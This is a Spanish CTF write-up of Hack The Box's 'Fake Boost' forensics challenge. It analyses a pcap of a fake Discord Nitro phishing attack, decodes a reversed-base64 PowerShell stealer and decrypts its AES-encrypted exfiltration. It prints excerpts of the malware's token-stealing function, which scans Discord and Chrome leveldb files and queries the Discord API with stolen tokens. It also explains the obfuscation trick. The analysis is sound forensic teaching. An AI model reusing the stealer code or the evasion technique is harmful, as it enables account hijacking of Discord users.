---
title: "Fake Boost"
description: "Writeup de Fake Boost - Hack The Box - Forensics 200pts. pcapng de campaña de phishing Discord Nitro; HTTP GET descarga discordnitro.ps1 (base64 invertido); script roba tokens Discord y cifra datos del usuario con AES-CBC; POST exfiltra datos cifrados; descifrar el JSON revela la flag en el campo Email."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - powershell
  - discord
  - aes
  - cbc
  - cryptography
  - phishing
  - token-theft
---

# Fake Boost

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Un archivo `capture.pcapng` de 20,405 frames captura un ataque de phishing que simula ofrecer Discord Nitro gratuito. La víctima descarga `discordnitro.ps1` — un script PowerShell ofuscado con base64 invertido — que busca tokens de Discord en el sistema, obtiene información del usuario vía la API de Discord, cifra todo con AES-CBC, y lo exfiltra vía POST. Al descifrar el cuerpo del POST con la clave AES embebida en el script, se recupera un JSON con los datos robados. La flag está en el campo `Email` de ese JSON, codificada en base64.

---

## Reconocimiento del pcap

```bash
tshark -r capture.pcapng -q -z io,phs
# 20405 frames totales: QUIC, TLS, HTTP (cleartext)

# Filtrar solo HTTP (tráfico no cifrado)
tshark -r capture.pcapng -Y "http" -T fields -e http.request.method -e http.request.uri
```

```
GET  /freediscordnitro
POST /rj1893rj1joijdkajwda
```

Dos peticiones HTTP relevantes:
1. `GET /freediscordnitro` → descarga el script malicioso
2. `POST /rj1893rj1joijdkajwda` → exfiltra los datos robados cifrados

---

## Extracción del script PowerShell

```bash
tshark -r capture.pcapng --export-objects http,http_resp
ls http_resp/
# freediscordnitro

file http_resp/freediscordnitro
# ASCII text — script PowerShell ofuscado
```

El script contiene un blob de texto largo. La deofuscación básica:

```bash
cat http_resp/freediscordnitro | tr -d '\n' | tr -d ' ' | rev | base64 -d > decoder.ps1
```

El pipeline:
1. **`tr -d '\n'`** — elimina saltos de línea para obtener un único string
2. **`tr -d ' '`** — elimina espacios
3. **`rev`** — invierte el string
4. **`base64 -d`** — decodifica el base64 resultante

---

## Análisis de decoder.ps1

```bash
grep -E "AES_KEY|Steal|Token|Email|POST" decoder.ps1 | head -30
```

El script deofuscado revela la arquitectura del malware:

```powershell
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object System.Security.Cryptography.AesManaged
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) { $aesManaged.IV = $IV }
    if ($key) { $aesManaged.Key = $key }
    $aesManaged
}

function Steal {
    $tokens = @()
    # Busca tokens en paths de Discord, browsers, etc.
    $paths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
        # ...
    )
    foreach ($path in $paths) {
        Get-ChildItem $path -Filter "*.ldb" | ForEach-Object {
            Select-String -Path $_.FullName -Pattern '[A-Za-z\d]{24}\.[A-Za-z\d]{6}\.[A-Za-z\d]{25,110}'
        }
    }
}

function Get-DiscordUserInfo($token) {
    # Llama a la API de Discord con el token robado
    $headers = @{ "Authorization" = $token }
    $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Headers $headers
    return $response
}
```

La función `Steal` extrae tokens Discord de leveldb en disco. Con el token llama a la API y obtiene el perfil del usuario (nombre, email, etc.).

---

## Extracción del POST cifrado

```bash
tshark -r capture.pcapng -Y "http.request.method == POST" \
    -T fields -e http.request.uri -e http.file_data
```

El cuerpo del POST es el JSON del usuario cifrado en AES-CBC, codificado en base64.

---

## Descifrado de los datos exfiltrados

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import json

# Clave AES del script PowerShell
aes_key_b64 = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
key = base64.b64decode(aes_key_b64)  # 32 bytes → AES-256

# Datos exfiltrados del POST (extraídos del pcap)
# El formato PowerShell AesManagedObject incluye el IV en los primeros 16 bytes
encrypted_b64 = "<POST_body_base64_del_pcap>"
encrypted = base64.b64decode(encrypted_b64)

iv  = encrypted[:16]
enc = encrypted[16:]

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(enc).rstrip(b'\x00')
data = json.loads(decrypted.decode('utf-8'))

print(json.dumps(data, indent=2))
```

```json
{
  "id": "1234567890",
  "username": "victim_user",
  "discriminator": "0000",
  "email": "SFRCe2ZyMzNfTjE3ckczbl8zeHAwNTNkIV9iM1c0cjNfMGZfVDAwX2cwMGRfMl9iM183cnUzXzBmZjNyNX0=",
  "token": "MTE5..."
}
```

El campo `Email` no es un email real — es una cadena base64:

```bash
echo "SFRCe2ZyMzNfTjE3ckczbl8zeHAwNTNkIV9iM1c0cjNfMGZfVDAwX2cwMGRfMl9iM183cnUzXzBmZjNyNX0=" | base64 -d
```

```text
HTB{FLAG}
```

---

## Cadena de Ataque

```text
1. Víctima hace clic en enlace "Free Discord Nitro"
       ↓
2. GET /freediscordnitro → descarga discordnitro.ps1 (base64 invertido)
       ↓
3. Script deofusca → Steal() busca tokens Discord en leveldb local
       ↓
4. Get-DiscordUserInfo(token) → llama API Discord → obtiene perfil + email
       ↓
5. Serializa JSON → cifra AES-256-CBC con IV aleatorio antepuesto
       ↓
6. POST /rj1893rj1joijdkajwda → exfiltra datos cifrados al C2
       ↓
7. Descifrar POST body → JSON con Email en base64 → HTB{FLAG}
```

---

## Lecciones Aprendidas

- **Discord tokens en disco**: los tokens de Discord se almacenan en texto plano en archivos leveldb del cliente. Son altamente valorados por atacantes — permiten acceso completo a la cuenta sin contraseña.
- **Ofuscación base64+reverse**: `rev | base64 -d` es una técnica simple pero efectiva para evadir inspección textual y algunos AV. Siempre probar permutaciones de decodificación.
- **AES con IV prepended**: un patrón común en implementaciones PowerShell — el IV se genera aleatoriamente por sesión y se antepone al ciphertext. Siempre tomar los primeros 16 bytes como IV.
- **Campos JSON con base64**: datos sensibles en JSON pueden estar codificados en campos que parecen normales (email, username). Probar `base64 -d` en todos los campos de valor sospechoso.

---

## Referencias

- [MITRE ATT&CK — Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
- [Discord Token Theft — análisis técnico](https://attack.mitre.org/techniques/T1528/)
- [HackTricks — Discord Token Stealer](https://book.hacktricks.xyz/)
- [Python cryptography — AES CBC](https://pycryptodome.readthedocs.io/en/latest/src/cipher/classic.html#cbc-mode)
